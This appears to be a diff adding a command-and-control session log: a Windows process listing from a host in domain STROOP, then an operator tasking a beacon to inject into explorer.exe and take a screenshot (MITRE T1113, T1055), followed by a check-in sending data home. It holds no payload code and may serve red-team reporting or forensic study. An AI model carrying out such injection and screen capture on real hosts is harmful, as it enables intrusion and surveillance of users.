+unsecapp.exe	920	3728	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3928	x64	NT AUTHORITY\LOCAL SERVICE	0
+WmiPrvSE.exe	920	3312	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	4320	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	4744	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	4776	x64	NT AUTHORITY\SYSTEM	0
+taskhostw.exe	1256	4688	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2656	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	5428	x64	NT AUTHORITY\LOCAL SERVICE	0
+WaSecAgentProv.exe	3196	6060	x64	NT AUTHORITY\SYSTEM	0
+conhost.exe	6060	6088	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1076	x64	NT AUTHORITY\LOCAL SERVICE	0
+SgrmBroker.exe	696	5940	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	6068	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	5920	x64	NT AUTHORITY\LOCAL SERVICE	0
+SearchIndexer.exe	696	5636	x64	NT AUTHORITY\SYSTEM	0
+SecurityHealthService.exe	696	4104	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	5788	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	5132	4300	x64	NT AUTHORITY\SYSTEM	2
+winlogon.exe	5132	4592	x64	NT AUTHORITY\SYSTEM	2
+dwm.exe	4592	3272	x64	Window Manager\DWM-2	2
+fontdrvhost.exe	4592	5980	x64	Font Driver Host\UMFD-2	2
+rdpclip.exe	1032	5588	x64	STROOP\ADMIN-W.Trommel	2
+sihost.exe	1520	464	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	4388	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	1116	x64	STROOP\ADMIN-W.Trommel	2
+taskhostw.exe	1256	1748	x64	STROOP\ADMIN-W.Trommel	2
+powershell.exe	1256	1464	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	5652	x64	NT AUTHORITY\SYSTEM	0
+conhost.exe	1464	1684	x64	STROOP\ADMIN-W.Trommel	2
+ctfmon.exe	5652	1060	x64	STROOP\ADMIN-W.Trommel	2
+explorer.exe	4684	4632	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	372	x64	STROOP\ADMIN-W.Trommel	2
+ShellExperienceHost.exe	920	6160	x64	STROOP\ADMIN-W.Trommel	2
+SearchUI.exe	920	6276	x64	STROOP\ADMIN-W.Trommel	2
+RuntimeBroker.exe	920	6464	x64	STROOP\ADMIN-W.Trommel	2
+RuntimeBroker.exe	920	6568	x64	STROOP\ADMIN-W.Trommel	2
+powershell.exe	1464	6908	x64	STROOP\ADMIN-W.Trommel	2
+conhost.exe	6908	6916	x64	STROOP\ADMIN-W.Trommel	2
+powershell.exe	1464	7004	x64	STROOP\ADMIN-W.Trommel	2
+conhost.exe	7004	7012	x64	STROOP\ADMIN-W.Trommel	2
+RuntimeBroker.exe	920	2296	x64	STROOP\ADMIN-W.Trommel	2
+iexplore.exe	920	6376	x64	STROOP\ADMIN-W.Trommel	2
+iexplore.exe	6376	2320	x86	STROOP\ADMIN-W.Trommel	2
+smartscreen.exe	920	7204	x64	STROOP\ADMIN-W.Trommel	2
+SecurityHealthSystray.exe	4632	7248	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	7532	x64	NT AUTHORITY\SYSTEM	0
+LogonUI.exe	4592	3888	x64	NT AUTHORITY\SYSTEM	2
+dllhost.exe	920	3128	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	4552	x64	STROOP\ADMIN-W.Trommel	2
+rundll32.exe	7372	3284	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	5168	x64	NT AUTHORITY\SYSTEM	0
+powershell.exe	3284	7776	x64	NT AUTHORITY\SYSTEM	0
+conhost.exe	7776	7548	x64	NT AUTHORITY\SYSTEM	0
+WmiPrvSE.exe	920	1092	x64	NT AUTHORITY\LOCAL SERVICE	0
+SearchProtocolHost.exe	5636	7836	x64	NT AUTHORITY\SYSTEM	0
+SearchFilterHost.exe	5636	8020	x64	NT AUTHORITY\SYSTEM	0
+
+
+03/30 09:37:47 UTC [input] <neo> screenshot 4632 x64
+03/30 09:37:47 UTC [task] <T1113, T1055> Tasked beacon to take a screenshot in 4632/x64
+03/30 09:38:13 UTC [checkin] host called home, sent: 197218 bytes
